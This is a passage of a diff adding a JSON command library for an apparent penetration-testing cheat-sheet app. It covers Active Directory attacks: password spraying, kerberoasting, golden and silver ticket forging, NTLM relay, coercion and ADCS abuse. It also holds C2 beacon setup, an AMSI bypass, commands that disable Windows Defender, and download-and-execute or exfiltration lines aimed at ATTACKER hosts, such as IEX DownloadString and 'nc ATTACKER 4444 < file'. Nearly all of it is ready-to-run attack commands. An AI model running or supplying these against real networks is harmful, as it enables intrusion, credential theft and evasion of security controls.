+            "description": "Only test one password per user if both <u> and <p> are files."
+          },
+          {
+            "title": "Local Authentication",
+            "command": "--local-auth",
+            "description": "Use local authentication on the target."
+          },
+          {
+            "title": "Kerberos Auth",
+            "command": "--kerberos",
+            "description": "Force Kerberos authentication (FQDN required)."
+          },
+          {
+            "title": "Custom Port",
+            "command": "--port {PORT}",
+            "description": "Specify a custom port for the protocol."
+          }
+        ]
+      },
+      {
+        "name": "Exporting",
+        "commands": [
+          {
+            "title": "Export Output",
+            "command": "--export $(pwd)/output.txt",
+            "description": "Export CME output in JSON format."
+          },
+          {
+            "title": "Format Output for jq",
+            "command": "sed -i \"s/'/\\\"/g\" output.txt",
+            "description": "Format exported JSON for jq."
+          },
+          {
+            "title": "Redirect Output",
+            "command": "cme [protocol] {HOST} > output.txt",
+            "description": "Redirect CME output to a file if --export isn't supported."
+          }
+        ]
+      },
+      {
+        "name": "Authentication & Password Spraying",
+        "commands": [
+          {
+            "title": "Anonymous SMB",
+            "command": "cme smb {HOST} -u 'nop' -p ''",
+            "description": "Test anonymous SMB logon."
+          },
+          {
+            "title": "Domain Authentication",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Test domain authentication using username and password."
+          },
+          {
+            "title": "Continue on Success",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --continue-on-success",
+            "description": "Continue testing after a valid credential is found."
+          },
+          {
+            "title": "Kerberos AES Key",
+            "command": "cme smb {HOST} -u {USERNAME} --aesKey {AES_128/AES_256}",
+            "description": "Authenticate using AES-128 or AES-256 hashes for Kerberos."
+          },
+          {
+            "title": "No Bruteforce File Mode",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --no-bruteforce",
+            "description": "Test passwords line by line when <u> and <p> are files."
+          },
+          {
+            "title": "Force Domain Name",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -d {DOMAIN}",
+            "description": "Force domain for authentication."
+          }
+        ]
+      },
+      {
+        "name": "SMB Enumeration",
+        "commands": [
+          {
+            "title": "Enumerate Hosts",
+            "command": "cme smb {HOST}",
+            "description": "Get OS version, SMB version, and IP of hosts."
+          },
+          {
+            "title": "Generate Relay List",
+            "command": "cme smb {HOST} --gen-relay-list output.txt",
+            "description": "Map live hosts not requiring SMB signing."
+          },
+          {
+            "title": "Enumerate Sessions",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --sessions",
+            "description": "List active sessions on the target."
+          },
+          {
+            "title": "Enumerate Shares",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --shares",
+            "description": "List share permissions."
+          },
+          {
+            "title": "Enumerate Disks",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --disks",
+            "description": "List disks on the target."
+          },
+          {
+            "title": "Enumerate Logged Users",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --loggedon-users",
+            "description": "List logged-in users."
+          }
+        ]
+      },
+      {
+        "name": "LDAP Enumeration",
+        "commands": [
+          {
+            "title": "Enumerate Users",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --users",
+            "description": "List enabled domain users."
+          },
+          {
+            "title": "Enumerate Groups",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --groups",
+            "description": "List domain groups."
+          },
+          {
+            "title": "Password Not Required",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --password-not-required",
+            "description": "List users with PASSWD_NOTREQD flag."
+          },
+          {
+            "title": "Trusted for Delegation",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --trusted-for-delegation",
+            "description": "List users/computers trusted for delegation."
+          },
+          {
+            "title": "Admin Count",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --admin-count",
+            "description": "Get objects with adminCount=1."
+          },
+          {
+            "title": "Get Domain SID",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --get-sid",
+            "description": "Retrieve domain SID."
+          },
+          {
+            "title": "Enumerate GMSA",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --gmsa",
+            "description": "Enumerate GMSA passwords."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-kerberos",
+    "name": "AD Kerberos",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Kerberoasting",
+        "commands": [
+          {
+            "title": "Invoke-Kerberoast (Windows)",
+            "command": "Invoke-Kerberoast",
+            "description": "Get Kerberoastable accounts and hashes on Windows."
+          },
+          {
+            "title": "GetUserSPNs.py (Linux)",
+            "command": "GetUserSPNs.py {DOMAIN}/{USER}",
+            "description": "Get Kerberoastable accounts and hashes on Linux."
+          }
+        ]
+      },
+      {
+        "name": "AS-REP Roasting",
+        "commands": [
+          {
+            "title": "Get-DomainUser (Windows)",
+            "command": "Get-DomainUser -UACFilter DONT_REQ_PREAUTH",
+            "description": "Retrieve AS-REP roastable accounts and hashes on Windows."
+          },
+          {
+            "title": "GetNPUsers.py (Linux)",
+            "command": "GetNPUsers.py {DOMAIN}/{USER}",
+            "description": "Retrieve AS-REP roastable accounts and hashes on Linux."
+          }
+        ]
+      },
+      {
+        "name": "TGS Monitoring and Requests",
+        "commands": [
+          {
+            "title": "Monitor TGT Copies",
+            "command": "Rubeus.exe monitor /interval:5",
+            "description": "Monitor TGT copies in TGS every 5 seconds (Unconstrained Delegation)."
+          },
+          {
+            "title": "Request TGS",
+            "command": "Rubeus.exe asktgs /ticket:{TICKET} /service:{SPN} /ptt",
+            "description": "Request a TGS using a TGT and pass it to memory."
+          },
+          {
+            "title": "Renew TGT",
+            "command": "Rubeus.exe renew /ticket:{TICKET} /ptt",
+            "description": "Renew a TGT and pass it in memory."
+          }
+        ]
+      },
+      {
+        "name": "Delegation",
+        "commands": [
+          {
+            "title": "Get Trusted to Auth (Windows)",
+            "command": "Get-DomainComputer -TrustedToAuth",
+            "description": "Retrieve service accounts with constrained delegation."
+          },
+          {
+            "title": "Find Delegation (Linux)",
+            "command": "findDelegation.py {DOMAIN}/{USER}",
+            "description": "Retrieve service accounts with delegation."
+          },
+          {
+            "title": "S4U2Self / S4U2Proxy (Windows)",
+            "command": "Rubeus.exe s4u /impersonateuser:{USER} /msdsspn:{SPN} /altservice:{SRV} /user:{USER} /rc4:{NT_HASH} /ptt",
+            "description": "Perform S4U2* attack on Windows."
+          },
+          {
+            "title": "S4U2Self / S4U2Proxy (Linux)",
+            "command": "getST.py -spn {SPN} -hashes :{NT_HASH} '{DOMAIN}/{USER}' -impersonate {USER}",
+            "description": "Perform S4U2* attack on Linux."
+          }
+        ]
+      },
+      {
+        "name": "Golden Tickets",
+        "commands": [
+          {
+            "title": "Forge Golden Ticket (Windows)",
+            "command": "mimikatz # kerberos::golden /domain:{DOMAIN} /user:{USER} /sid:{SID} /rc4:{NT_HASH} /ptt",
+            "description": "Forge a Golden Ticket on Windows."
+          },
+          {
+            "title": "Forge Golden Ticket (Linux)",
+            "command": "ticketer.py -nthash {NT_HASH} -domain-sid {SID} -domain {DOMAIN} {USER}",
+            "description": "Forge a Golden Ticket on Linux."
+          }
+        ]
+      },
+      {
+        "name": "Silver Tickets",
+        "commands": [
+          {
+            "title": "Forge Silver Ticket (Windows)",
+            "command": "mimikatz # kerberos::golden /domain:{DOMAIN} /user:{USER} /sid:{SID} /rc4:{SERVICE_NT_HASH} /target:{TARGET_SERVICE_ACCOUNT} /service:{SERVICE} /ptt",
+            "description": "Forge a Silver Ticket on Windows."
+          },
+          {
+            "title": "Forge Silver Ticket (Linux)",
+            "command": "ticketer.py -nthash {SERVICE_NT_HASH} -domain-sid {SID} -domain {DOMAIN} -spn {SPN} {USER}",
+            "description": "Forge a Silver Ticket on Linux."
+          }
+        ]
+      },
+      {
+        "name": "TGT Extraction",
+        "commands": [
+          {
+            "title": "Dump TGT in Memory",
+            "command": "Rubeus.exe dump /luid:0x89275d /service:krbtgt",
+            "description": "Dump TGTs from memory."
+          }
+        ]
+      },
+      {
+        "name": "User Enumeration & Password Spraying",
+        "commands": [
+          {
+            "title": "Kerberos User Enumeration",
+            "command": "kerbrute userenum {USER_LIST} --dc {DC} -d {DOMAIN}",
+            "description": "Enumerate user accounts via Kerberos."
+          },
+          {
+            "title": "Kerberos Password Spraying",
+            "command": "kerbrute passwordspray {USER_LIST} {PASSWORD} --dc {DC} -d {DOMAIN}",
+            "description": "Perform password spraying via TGT request."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "lateral-movement",
+    "name": "Lateral Movement",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Lateral Movement",
+        "commands": []
+      }
+    ]
+  },
+  {
+    "id": "c2",
+    "name": "C2",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Sliver",
+        "commands": [
+          {
+            "title": "Generate Beacon",
+            "command": "generate beacon --http ATTACKER_IP --save /tmp/beacon"
+          },
+          {
+            "title": "Start Listener",
+            "command": "http"
+          },
+          {
+            "title": "Sessions",
+            "command": "sessions"
+          },
+          {
+            "title": "Use Session",
+            "command": "use SESSION_ID"
+          }
+        ]
+      },
+      {
+        "name": "Cobalt Strike",
+        "commands": [
+          {
+            "title": "Start Team Server",
+            "command": "./teamserver ATTACKER_IP password"
+          },
+          {
+            "title": "Generate Payload",
+            "command": "Attacks -> Packages -> Windows Executable"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "file-transfers",
+    "name": "File Transfers",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Linux",
+        "commands": [
+          {
+            "title": "Python HTTP",
+            "command": "python3 -m http.server 80"
+          },
+          {
+            "title": "Wget",
+            "command": "wget http://ATTACKER/file"
+          },
+          {
+            "title": "Curl",
+            "command": "curl http://ATTACKER/file -o file"
+          },
+          {
+            "title": "Netcat Send",
+            "command": "nc ATTACKER 4444 < file"
+          },
+          {
+            "title": "Netcat Recv",
+            "command": "nc -lvp 4444 > file"
+          }
+        ]
+      },
+      {
+        "name": "Windows",
+        "commands": [
+          {
+            "title": "Certutil",
+            "command": "certutil -urlcache -f http://ATTACKER/file file.exe"
+          },
+          {
+            "title": "PowerShell",
+            "command": "IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER/script.ps1\")"
+          },
+          {
+            "title": "PowerShell File",
+            "command": "(New-Object Net.WebClient).DownloadFile(\"http://ATTACKER/file\",\"C:\\file.exe\")"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ntlm-relay",
+    "name": "NTLM Relay Attacks",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Enumeration",
+        "commands": [
+          {
+            "title": "Responder Analyze Mode",
+            "command": "python3 Responder.py -I {INTERFACE} -A",
+            "description": "Start Responder in Analyze Mode."
+          },
+          {
+            "title": "Responder Poisoning Mode",
+            "command": "python3 Responder.py -I {INTERFACE}",
+            "description": "Start Responder to poison the network."
+          },
+          {
+            "title": "Network Fingerprint Scan",
+            "command": "python3 RunFinger.py -i {NETWORK_CIDR}",
+            "description": "Enumerate hosts with SMB signing off and detect standard services."
+          },
+          {
+            "title": "Generate Relay Target List",
+            "command": "crackmapexec smb {NETWORK_CIDR} --gen-relay-list relayTargets.txt",
+            "description": "List hosts suitable for NTLM relay attacks."
+          },
+          {
+            "title": "Enumerate Shares",
+            "command": "crackmapexec smb {NETWORK_CIDR} -u anonymous -p '' --shares",
+            "description": "Enumerate available shared folders."
+          },
+          {
+            "title": "Enumerate WebDav Servers",
+            "command": "crackmapexec smb {TARGET} -u {USER}$ -p {PASSWORD} -M webdav",
+            "description": "Detect WebDav servers on the target."
+          }
+        ]
+      },
+      {
+        "name": "Farming Hashes",
+        "commands": [
+          {
+            "title": "Create NTLM Theft Files",
+            "command": "python3 ntlm_theft.py -g all -s {SERVER_IP} -f '@myfile'",
+            "description": "Generate NTLM theft files for capturing hashes."
+          },
+          {
+            "title": "Generate Shortcut LNK",
+            "command": "crackmapexec smb {TARGET} -u anonymous -p '' -M slinky -o SERVER={SERVER_IP} NAME={FILENAME}",
+            "description": "Generate a .lnk file pointing to a remote server."
+          },
+          {
+            "title": "Generate Search Connector",
+            "command": "crackmapexec smb {TARGET} -u anonymous -p '' -M drop-sc -o URL={URL} SHARE={SHARE} FILENAME={FILENAME}",
+            "description": "Generate a .searchConnector-ms file for NTLM capture."
+          }
+        ]
+      },
+      {
+        "name": "NTLMRelayx",
+        "commands": [
+          {
+            "title": "Relay Attack to Multiple Targets",
+            "command": "ntlmrelayx.py -tf relayTargets.txt -smb2support",
+            "description": "Relay NTLM authentication to all hosts listed in relayTargets.txt."
+          },
+          {
+            "title": "Relay Single Target SMB Command",
+            "command": "ntlmrelayx.py -t {TARGET_IP} -smb2support -c \"{COMMAND}\"",
+            "description": "Execute a command on a single target via NTLM relay."
+          },
+          {
+            "title": "Relay to Named Target",
+            "command": "ntlmrelayx.py -t smb://{DOMAIN}\\{USER}@{TARGET_IP}",
+            "description": "Relay NTLM to a specific named target."
+          },
+          {
+            "title": "Interactive SMB Shells",
+            "command": "ntlmrelayx.py -tf relayTargets.txt -smb2support -i",
+            "description": "Open interactive SMB client shells to relayed targets."
+          },
+          {
+            "title": "Query MSSQL",
+            "command": "ntlmrelayx.py -t mssql://{DOMAIN}\\{USER}@{TARGET_IP} -smb2support -q \"{SQL_QUERY}\"",
+            "description": "Execute a SQL query via relayed NTLM session."
+          },
+          {
+            "title": "Domain Enumeration",
+            "command": "ntlmrelayx.py -t ldap://{TARGET} -smb2support --no-da --no-acl --lootdir {OUTPUT_DIR}",
+            "description": "Enumerate domain information using NTLM relay to LDAP."
+          }
+        ]
+      },
+      {
+        "name": "Coerce Authentication",
+        "commands": [
+          {
+            "title": "PrinterBug",
+            "command": "python3 printerbug.py {DOMAIN}/{USER}:'{PASSWORD}'@{TARGET_IP} {COERCE_IP}",
+            "description": "Abuse MS-RPRN PrinterBug to coerce authentication."
+          },
+          {
+            "title": "PetitPotam",
+            "command": "python3 PetitPotam.py {TARGET_IP} {DC_IP} -u '{USER}' -p '{PASSWORD}' -d {DOMAIN}",
+            "description": "Abuse MS-EFSR to coerce authentication."
+          },
+          {
+            "title": "DFSCoerce",
+            "command": "python3 dfscoerce.py -u '{USER}' -p '{PASSWORD}' {COERCE_IP} {TARGET_IP}",
+            "description": "Abuse MS-DFSNM to coerce authentication."
+          }
+        ]
+      },
+      {
+        "name": "Kerberos RBCD Abuse",
+        "commands": [
+          {
+            "title": "RBCD Exploit",
+            "command": "ntlmrelayx.py -t ldaps://{DOMAIN}\\{USER}$@{DC_IP} --delegate-access --escalate-user '{VICTIM_USER}' --no-smb-server --no-dump",
+            "description": "Abuse RBCD to escalate privileges."
+          },
+          {
+            "title": "Generate Ticket",
+            "command": "getST.py -spn {SPN} -impersonate {ADMIN} -dc-ip {DC_IP} \"{DOMAIN}\"/{USER}:\"{PASSWORD}\"",
+            "description": "Generate a service ticket using impersonation."
+          },
+          {
+            "title": "Use Ticket with Psexec",
+            "command": "KRB5CCNAME={CCACHE_FILE} psexec.py -k -no-pass {TARGET}",
+            "description": "Use a Kerberos ticket to execute commands on a remote machine."
+          }
+        ]
+      },
+      {
+        "name": "Shadow Credentials",
+        "commands": [
+          {
+            "title": "Execute Shadow Credentials Attack",
+            "command": "ntlmrelayx.py -t ldap://{DOMAIN}\\{USER}@{DC_IP} --shadow-credentials --shadow-target {TARGET_USER} --no-da --no-dump --no-acl",
+            "description": "Capture shadow credentials for a target account."
+          },
+          {
+            "title": "Load Certificate & Key",
+            "command": "python3 gettgtpkinit.py -cert-pfx {CERTIFICATE} -pfx-pass {PASSWORD} {DOMAIN}/{USER} {CCACHE_FILE}",
+            "description": "Load certificate and key to generate a TGT."
+          },
+          {
+            "title": "Use Shadow Ticket with EvilWinRM",
+            "command": "KRB5CCNAME={CCACHE_FILE} evil-winrm -i {DC} -r {DOMAIN}",
+            "description": "Use the TGT to connect to a target machine."
+          }
+        ]
+      },
+      {
+        "name": "AD CS ESC8 & ESC11 Attacks",
+        "commands": [
+          {
+            "title": "Enumerate ADCS Servers",
+            "command": "crackmapexec ldap {NETWORK_CIDR} -u '{USER}' -p '{PASSWORD}' -M adcs",
+            "description": "List Active Directory Certificate Services servers."
+          },
+          {
+            "title": "Enumerate ADCS Certificates",
+            "command": "crackmapexec ldap {DC_IP} -u {USER} -p '{PASSWORD}' -M adcs -o SERVER={CA_SERVER}",
+            "description": "List available certificates on the ADCS server."
+          },
+          {
+            "title": "Certipy Enumeration",
+            "command": "certipy find -enabled -u '{USER}'@{DC_IP} -p '{PASSWORD}' -stdout",
+            "description": "Enumerate CA configuration with Certipy."
+          },
+          {
+            "title": "Relay ADCS to Machine",
+            "command": "ntlmrelayx.py -t http://{DC_IP}/certsrv/certfnsh.asp -smb2support --adcs --template Machine",
+            "description": "Perform AD CS Relay attacks targeting a machine account."
+          },
+          {
+            "title": "Coerce NTLM Authentication",
+            "command": "python3 printerbug.py {DOMAIN}/{USER}:'{PASSWORD}'@{TARGET} {COERCE_IP}",
+            "description": "Coerce SMB NTLM authentication using PrinterBug."
+          },
+          {
+            "title": "Request TGT via gettgtpkinit.py",
+            "command": "python3 gettgtpkinit.py -dc-ip {DC_IP} -cert-pfx {CERTIFICATE} '{DOMAIN}/{USER}$' {CCACHE_FILE}",
+            "description": "Request a TGT using a certificate."
+          },
+          {
+            "title": "Retrieve NT Hash",
+            "command": "KRB5CCNAME={CCACHE_FILE} python3 getnthash.py '{DOMAIN}/{USER}$' -key {KEY}",
+            "description": "Extract NT hash of a machine account."
+          }
+        ]
+      },
+      {
+        "name": "Create Silver Ticket",
+        "commands": [
+          {
+            "title": "Obtain Domain SID",
+            "command": "lookupsid.py '{DOMAIN}/{USER}$'@{DC_IP} -hashes :{HASH}",
+            "description": "Retrieve the Domain SID."
+          },
+          {
+            "title": "Forge Silver Ticket",
+            "command": "ticketer.py -nthash {HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn {SPN} {USER}",
+            "description": "Forge a Silver Ticket for the specified SPN and user."
+          },
+          {
+            "title": "Use Silver Ticket with Psexec",
+            "command": "KRB5CCNAME={CCACHE_FILE} psexec.py -k -no-pass {TARGET}",
+            "description": "Use Silver Ticket to gain interactive shell via psexec.py."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-adcs",
+    "name": "AD ADCS",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Enumeration",
+        "commands": [
+          {
+            "title": "Certipy Find",
+            "command": "certipy find -u user@domain -p pass -dc-ip DC-IP"
+          },
+          {
+            "title": "Certify",
+            "command": "Certify.exe find /vulnerable"
+          }
+        ]
+      },
+      {
+        "name": "ESC1",
+        "commands": [
+          {
+            "title": "Request Cert",
+            "command": "certipy req -u user@domain -p pass -ca CA-NAME -template TEMPLATE -upn administrator@domain -dc-ip DC-IP"
+          },
+          {
+            "title": "Auth with Cert",
+            "command": "certipy auth -pfx administrator.pfx -dc-ip DC-IP"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "local-enumeration",
+    "name": "Local Enumeration",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Linux",
+        "commands": [
+          {
+            "title": "Current User",
+            "command": "id && whoami"
+          },
+          {
+            "title": "OS Version",
+            "command": "cat /etc/os-release"
+          },
+          {
+            "title": "Kernel",
+            "command": "uname -a"
+          },
+          {
+            "title": "Network",
+            "command": "ip a && ss -tulpn"
+          },
+          {
+            "title": "Processes",
+            "command": "ps aux"
+          },
+          {
+            "title": "Cron Jobs",
+            "command": "cat /etc/crontab && ls -la /etc/cron.*"
+          }
+        ]
+      },
+      {
+        "name": "Windows",
+        "commands": [
+          {
+            "title": "User Info",
+            "command": "whoami /all"
+          },
+          {
+            "title": "System",
+            "command": "systeminfo"
+          },
+          {
+            "title": "Network",
+            "command": "ipconfig /all && netstat -ano"
+          },
+          {
+            "title": "Scheduled Tasks",
+            "command": "schtasks /query /fo LIST /v"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "powershell-powerview",
+    "name": "PowerShell PowerView",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Setup",
+        "commands": [
+          {
+            "title": "Bypass Execution",
+            "command": "Set-ExecutionPolicy Bypass -Scope Process"
+          },
+          {
+            "title": "Import Module",
+            "command": ". .\\PowerView.ps1"
+          },
+          {
+            "title": "AMSI Bypass",
+            "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+          }
+        ]
+      },
+      {
+        "name": "Enumeration",
+        "commands": [
+          {
+            "title": "Find Computers",
+            "command": "Get-DomainComputer | select dnshostname"
+          },
+          {
+            "title": "Find DCs",
+            "command": "Get-DomainController"
+          },
+          {
+            "title": "Find Shares",
+            "command": "Find-DomainShare -CheckShareAccess"
+          },
+          {
+            "title": "Find GPO",
+            "command": "Get-DomainGPO"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "evasion",
+    "name": "Evasion Techniques",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "AMSI Bypass",
+        "commands": [
+          {
+            "title": "Basic Bypass",
+            "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+          }
+        ]
+      },
+      {
+        "name": "Defender",
+        "commands": [
+          {
+            "title": "Disable Defender",
+            "command": "Set-MpPreference -DisableRealtimeMonitoring $true"
+          },
+          {
+            "title": "Exclusion Path",
+            "command": "Add-MpPreference -ExclusionPath \"C:\\Tools\""
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "custom-1768833154829",
+    "name": "AD Enumeration & Attacks",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Initial Enumeration",
+        "commands": [
+          {
+            "title": "nslookup {HOST}",
+            "command": "nslookup {HOST}",
+            "description": "Query DNS to discover IP address mapping of the target."
+          },
+          {
+            "title": "sudo tcpdump",
+            "command": "sudo tcpdump -i ens224",
+            "description": "Start capturing network packets on the specified interface."
+          },
+          {
+            "title": "sudo responder",
+            "command": "sudo responder -I ens224 -A",
+            "description": "Start Responder for LLMNR, NBT-NS and MDNS in passive analysis mode."
+          },
+          {
+            "title": "Ping Sweep",
+            "command": "fping -asgq {HOST}/23",
+            "description": "Perform a ping sweep on the target network segment."
+          },
+          {
+            "title": "Nmap Scan",
+            "command": "sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum",
+            "description": "Perform Nmap scan with OS detection, version detection, scripts and traceroute."
+          },
+          {
+            "title": "Clone Kerbrute",
+            "command": "sudo git clone https://github.com/ropnop/kerbrute.git",
+            "description": "Clone Kerbrute tool from GitHub."
+          },
+          {
+            "title": "Make Help",
+            "command": "make help",
+            "description": "List compiling options available with make."
+          },
+          {
+            "title": "Compile Kerbrute",
+            "command": "sudo make all",
+            "description": "Compile Kerbrute binary for multiple OS platforms."
+          },
+          {
+            "title": "Test Kerbrute Binary",
+            "command": "./kerbrute_linux_amd64",
+            "description": "Test the compiled Kerbrute binary."
+          },
+          {
+            "title": "Move Kerbrute",
+            "command": "sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute",
+            "description": "Move Kerbrute binary to a directory in the PATH."
+          },
+          {
+            "title": "Kerbrute Username Enumeration",
+            "command": "./kerbrute_linux_amd64 userenum -d {HOST}/ --dc {HOST} {USERNAME}.txt -o kerb-results",
+            "description": "Run Kerbrute to discover usernames in a domain using a wordlist and output results to file."
+          }
+        ]
+      },
+      {
+        "name": "LLMNR/NTB-NS Poisoning",
+        "commands": [
+          {
+            "title": "Responder Help",
+            "command": "responder -h",
+            "description": "Display usage instructions for Responder."
+          },
+          {
+            "title": "Crack NTLMv2 Hashes",
+            "command": "hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt",
+            "description": "Crack captured NTLMv2 hashes using hashcat and a wordlist."
+          },
+          {
+            "title": "Import Inveigh Module",
+            "command": "Import-Module .\\Inveigh.ps1",
+            "description": "Import Inveigh PowerShell module."
+          },
+          {
+            "title": "Invoke Inveigh",
+            "command": "Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y",
+            "description": "Start Inveigh with LLMNR & NBNS spoofing and log results to file."
+          },
+          {
+            "title": "Run Inveigh.exe",
+            "command": ".\\Inveigh.exe",
+            "description": "Start the C# implementation of Inveigh."
+          },
+          {
+            "title": "Disable NBT-NS",
+            "command": "$regkey = \"HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path \"$regkey\\$($_.pschildname)\" -Name NetbiosOptions -Value 2 -Verbose}",
+            "description": "Disable NBT-NS on a Windows host using PowerShell."
+          }
+        ]
+      },
+      {
+        "name": "Password Spraying & Password Policies",
+        "commands": [
+          {
+            "title": "Generate Username Combos",
+            "command": "#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done",
+            "description": "Generate possible username combinations."
+          },
+          {
+            "title": "CrackMapExec Password Policy",
+            "command": "crackmapexec smb {HOST} -u {USERNAME} -p {PASSWORD} --pass-pol",
+            "description": "Enumerate password policy with valid credentials."
+          },
+          {
+            "title": "RPCClient NULL Session",
+            "command": "rpcclient -U \"\" -N {HOST}",
+            "description": "Discover domain information via SMB NULL session."
+          },
+          {
+            "title": "RPCClient Query",
+            "command": "rpcclient $> querydominfo",
+            "description": "Enumerate password policy in a Windows domain."
+          },
+          {
+            "title": "Enum4Linux Policy",
+            "command": "enum4linux -P {HOST}",
+            "description": "Enumerate password policy using enum4linux."
+          },
+          {
+            "title": "Enum4Linux-ng",
+            "command": "enum4linux-ng -P {HOST} -oA ilfreight",
+            "description": "Enumerate password policy and output in YAML & JSON."
+          },
+          {
+            "title": "LDAP Search Password Policy",
+            "command": "ldapsearch -h {HOST} -x -b \"DC={HOST},DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength",
+            "description": "Enumerate password policy via LDAP search."
+          },
+          {
+            "title": "Net Accounts",
+            "command": "net accounts",
+            "description": "View Windows password policy on a local host."
+          },
+          {
+            "title": "Import PowerView",
+            "command": "Import-Module .\\PowerView.ps1",
+            "description": "Import PowerView module."
+          },
+          {
+            "title": "Get Domain Policy",
+            "command": "Get-DomainPolicy",
+            "description": "Retrieve domain password policy."
+          },
+          {
+            "title": "Enum Users enum4linux",
+            "command": "enum4linux -U {HOST} | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"",
+            "description": "Discover users in target Windows domain using enum4linux."
+          },
+          {
+            "title": "RPCClient Enum Users",
+            "command": "rpcclient -U \"\" -N {HOST} rpcclient $> enumdomuser",
+            "description": "Enumerate domain users via RPCClient."
+          },
+          {
+            "title": "CrackMapExec Users",
+            "command": "crackmapexec smb {HOST} --users",
+            "description": "Discover users in a Windows domain using CME."
+          },
+          {
+            "title": "LDAP Search Users",
+            "command": "ldapsearch -h {HOST} -x -b \"DC={HOST},DC=LOCAL\" -s sub \"(&(objectclass=user))\" | grep sAMAccountName: | cut -f2 -d\" \"",
+            "description": "Discover users in domain and output sAMAccountName."
+          },
+          {
+            "title": "Windapsearch Users",
+            "command": "./windapsearch.py --dc-ip {HOST} -u \"\" -U",
+            "description": "Discover users in a Windows domain using windapsearch."
+          },
+          {
+            "title": "RPCClient Password Spray",
+            "command": "for u in $(cat valid_users.txt); do rpcclient -U \"$u%{PASSWORD}\" -c \"getusername;quit\" {HOST} | grep Authority; done",
+            "description": "Perform password spraying with RPCClient using a user list."
+          },
+          {
+            "title": "Kerbrute Password Spray",
+            "command": "kerbrute passwordspray -d {HOST} --dc {HOST} valid_users.txt {PASSWORD}",
+            "description": "Perform password spraying attack using Kerbrute."
+          },
+          {
+            "title": "CME Password Spray",
+            "command": "sudo crackmapexec smb {HOST} -u valid_users.txt -p {PASSWORD} | grep +",
+            "description": "Perform password spraying using CrackMapExec, filtering failures."
+          },
+          {
+            "title": "Validate Credentials CME",
+            "command": "sudo crackmapexec smb {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Validate credentials with CrackMapExec."
+          },
+          {
+            "title": "CME Local Auth",
+            "command": "sudo crackmapexec smb --local-auth {HOST}/24 -u administrator -H {PASSWORD_HASH} | grep +",
+            "description": "Perform single login attempt to avoid lockouts using local-auth."
+          },
+          {
+            "title": "Import DomainPasswordSpray",
+            "command": "Import-Module .\\DomainPasswordSpray.ps1",
+            "description": "Import DomainPasswordSpray PowerShell module."
+          },
+          {
+            "title": "Invoke-DomainPasswordSpray",
+            "command": "Invoke-DomainPasswordSpray -Password {PASSWORD} -OutFile spray_success -ErrorAction SilentlyContinue",
+            "description": "Perform password spraying attack and output results to a file."
+          }
+        ]
+      },
+      {
+        "name": "Enumerating Security Controls",
+        "commands": [
+          {
+            "title": "Check Windows Defender",
+            "command": "Get-MpComputerStatus",
+            "description": "Check Windows Defender AV status."
+          },
+          {
+            "title": "View AppLocker Policies",
+            "command": "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections",
+            "description": "View AppLocker policy rules."
+          },
+          {
+            "title": "Check PowerShell Language Mode",
+            "command": "$ExecutionContext.SessionState.LanguageMode",
+            "description": "Discover PowerShell language mode in use."
+          },
+          {
+            "title": "Find LAPS Delegated Groups",
+            "command": "Find-LAPSDelegatedGroups",
+            "description": "Discover LAPS Delegated Groups."
+          },
+          {
+            "title": "Check LAPS Extended Rights",
+            "command": "Find-AdmPwdExtendedRights",
+            "description": "Check rights on computers with LAPS enabled."
+          },
+          {
+            "title": "Get LAPS Computers",
